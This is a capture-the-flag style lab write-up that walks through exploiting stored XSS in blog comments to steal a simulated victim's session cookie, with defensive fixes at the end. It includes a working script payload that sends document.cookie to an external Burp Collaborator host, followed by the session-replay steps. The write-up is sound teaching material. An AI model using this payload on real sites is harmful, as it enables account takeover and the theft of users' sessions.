Lab: Exploiting Cross-Site Scripting to Steal Cookies
Difficulty: Practitioner

This one’s all about classic XSS and cookie theft. The app has a stored XSS vuln in blog comments, and there’s a simulated victim (probably Carlos again) who views every comment shortly after it's posted. The goal is simple: steal his session cookie and use it to hijack his account.

Logged in with wiener:peter like usual, then headed to the blog and dropped a comment to test if script tags work. Yup—stored XSS is wide open.

Now, the lab wants us to use Burp Collaborator to receive the stolen cookie, so I popped open Burp Suite, went to the Collaborator tab, and grabbed a fresh payload URL.

Then submitted this payload in a blog comment, replacing the domain with my unique Collaborator subdomain:


<script>
fetch('https://your-burp-id.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
The fetch() runs when the victim loads the page, sending their cookie over to me via POST.

A few seconds later, I went back to Burp → Collaborator → clicked "Poll now", and saw the incoming HTTP request. In the body was the victim’s cookie—something like:


session=abcdef1234567890
Copied it, opened up Burp Repeater, and sent a request to /my-account with my cookie replaced by the victim’s. The page loaded, and boom—I was in their account.

Lab solved.

Root Cause

Stored XSS in user comments

No input sanitization

Victim automatically views all new comments

No protections like HttpOnly on cookies

Fixes

Sanitize user input properly—don’t allow script tags in comments

Set HttpOnly on sensitive cookies so they can't be accessed via JavaScript

Consider using CSP (Content Security Policy) as a defense-in-depth layer
